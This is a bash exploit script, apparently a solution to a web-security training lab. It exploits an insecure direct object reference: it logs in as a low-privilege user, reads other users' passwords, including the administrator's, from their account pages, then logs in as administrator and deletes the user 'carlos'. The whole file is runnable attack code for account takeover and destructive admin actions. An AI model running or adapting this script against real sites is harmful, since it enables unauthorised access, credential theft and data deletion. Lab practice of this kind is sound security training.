#!/bin/bash


get_csrf() {

    export csrf_cookie=$(curl -s -c - ${login_page} | awk '/session/ {print $NF}')
    export token=$(curl -s ${login_page} -b "session=${csrf_cookie}" | grep csrf | cut -d '"' -f 6)
    
}

login() {

    username=$2
    password=$3
    echo "(+) Logging is as user ${username}..."
    login_page="${url}/login"
    
    get_csrf "$login_page"

    credentials="csrf=${token}&username=${username}&password=${password}"
    export login_cookie=$(curl -s -c - "%{http_code}" "$login_page" -d "$credentials" -b "session=${csrf_cookie}" | awk '/session/ {print $NF}')

    home_page="${url}"
    response=$(curl -s "$home_page" -b "session=${login_cookie}")
    if echo "$response" | grep -q "my-account?id=${username}"; then
        echo "(+) Logged in successfully!"
    else
        echo "(-) Failed to log in"
        echo "(-) Exiting..."
        exit 1
    fi
}

get_password() {
    username=$2
    echo "(+) Getting ${username}'s password..."
    account="${url}/my-account?id=${username}"
    export password=$(curl -s "$account" -b "session=${login_cookie}" | grep name=password | cut -d "'" -f 2)
    if [ -n "$password" ]; then
        echo "(+) Found ${username}'s password: ${password}"
    else
        echo "(-) ${username}'s password not found."
        exit 1
    fi
}

delete_user() {

    login "$url" "administrator" "${password}"

    echo "(+) Deleting user Carlos..."
    
    delete_url="${url}/admin/delete?username=carlos"
    delete=$(curl -s -o /dev/null "${delete_url}" -b "session=${login_cookie}" -w "%{http_code}")

    if [[ "${delete}" -eq 302 ]]; then
        echo "(+) Deleted Carlos Successfully!"
    else
        echo "(-) Could not delete user Carlos"
        exit 1
    fi
}

main() {

    if [ $# -ne 1 ];then
        echo "(+) Usage: $0 website"
        echo "(+) Example: $0 www.example.com"
        exit 1

    fi

    echo "(+) Starting the script..."
    url=$1
    login "$url" "wiener" "peter"

    get_password "$url" "carlos"
    
    get_password "$url" "administrator"

    delete_user "$url"


}

main "$@"



























